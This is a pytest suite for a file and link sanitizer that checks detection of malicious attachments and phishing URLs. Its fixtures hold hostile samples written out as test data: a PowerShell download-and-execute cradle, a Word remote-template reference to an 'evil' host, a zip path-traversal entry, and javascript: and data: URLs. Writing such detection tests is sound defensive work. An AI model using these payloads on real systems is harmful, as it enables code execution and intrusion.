import io
import zipfile

import pytest
from fastapi import HTTPException

from services import sanitizer


def titles(result):
    return {f["title"] for f in result["findings"]}


def test_plain_text_is_clean():
    r = sanitizer.analyze_file("notes.txt", b"hello world\n")
    assert r["verdict"] == "clean"
    assert len(r["hashes"]["sha256"]) == 64


def test_double_extension_executable_is_dangerous():
    r = sanitizer.analyze_file("invoice.pdf.exe", b"MZ\x90\x00" + b"\x00" * 64)
    assert r["verdict"] == "dangerous"
    assert "Double extension" in titles(r)


def test_extension_mismatch_detected():
    r = sanitizer.analyze_file("photo.jpg", b"MZ\x90\x00" + b"\x00" * 64)
    assert "Content does not match extension" in titles(r)


def test_rtl_override_in_filename():
    r = sanitizer.analyze_file("report‮gpj.exe", b"MZ\x00\x00")
    assert "Hidden direction-override character in filename" in titles(r)


def test_pdf_javascript_and_launch():
    r = sanitizer.analyze_file("a.pdf", b"%PDF-1.4\n/OpenAction << /S /JavaScript /JS (x) >> /Launch")
    assert r["verdict"] == "dangerous"
    assert "Can launch an external program" in titles(r)


def _zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def test_zip_slip_and_executable():
    r = sanitizer.analyze_file("x.zip", _zip({"../evil.sh": "x", "run.exe": "x"}))
    assert "Path traversal in entry names" in titles(r)
    assert "Archive contains executables" in titles(r)


def test_docx_with_macro():
    r = sanitizer.analyze_file("x.docm", _zip({"word/document.xml": "<x/>", "word/vbaProject.bin": "x"}))
    assert "Contains VBA macros" in titles(r)


def test_remote_template_injection():
    rels = '<Relationship Type="attachedTemplate" Target="http://evil/x.dotm" TargetMode="External"/>'
    r = sanitizer.analyze_file("x.docx", _zip({"word/_rels/settings.xml.rels": rels}))
    assert "Loads remote content" in titles(r)


def test_html_script():
    r = sanitizer.analyze_file("a.html", b"<html><script>alert(1)</script></html>")
    assert r["verdict"] != "clean"


def test_powershell_download_cradle():
    r = sanitizer.analyze_file("a.txt", b"IEX (New-Object Net.WebClient).DownloadString('http://x')")
    assert r["verdict"] in {"suspicious", "dangerous"}


def test_empty_and_oversize_rejected():
    with pytest.raises(HTTPException) as e:
        sanitizer.analyze_file("a", b"")
    assert e.value.status_code == 400
    with pytest.raises(HTTPException) as e:
        sanitizer.analyze_file("a", b"0" * (sanitizer.MAX_FILE_BYTES + 1))
    assert e.value.status_code == 413


def test_link_strips_tracking_and_defangs():
    r = sanitizer.analyze_link("https://example.com/a?utm_source=x&id=7&fbclid=abc#top")
    assert r["clean_url"] == "https://example.com/a?id=7"
    assert r["defanged"] == "hxxps[://]example[.]com/a?id=7"
    assert r["verdict"] == "clean"


@pytest.mark.parametrize("url", ["javascript:alert(1)", "data:text/html,<script>x</script>"])
def test_dangerous_schemes(url):
    r = sanitizer.analyze_link(url)
    assert r["verdict"] == "dangerous"
    assert r["clean_url"] is None


def test_userinfo_trick_and_ip_host():
    r = sanitizer.analyze_link("http://paypal.com@203.0.113.9/login")
    assert "Credentials or '@' in the address" in titles(r)
    assert "Raw IP address instead of a domain name" in titles(r)


def test_brand_in_foreign_domain_and_punycode():
    r = sanitizer.analyze_link("https://paypal.secure-login.example.xyz/")
    assert "Brand name in subdomain of another domain" in titles(r)
    r = sanitizer.analyze_link("https://xn--pypal-4ve.com/")
    assert "Punycode (internationalised) domain" in titles(r)


def test_scheme_less_input_and_obfuscated_ip():
    assert sanitizer.analyze_link("example.com/x")["clean_url"] == "http://example.com/x"
    assert "Obfuscated numeric host" in titles(sanitizer.analyze_link("http://0x7f000001/"))


def test_trace_blocks_internal_hop(monkeypatch):
    r = sanitizer.analyze_link("http://127.0.0.1/", trace=True)
    assert any("Not contacted" in h["note"] for h in r["redirects"])
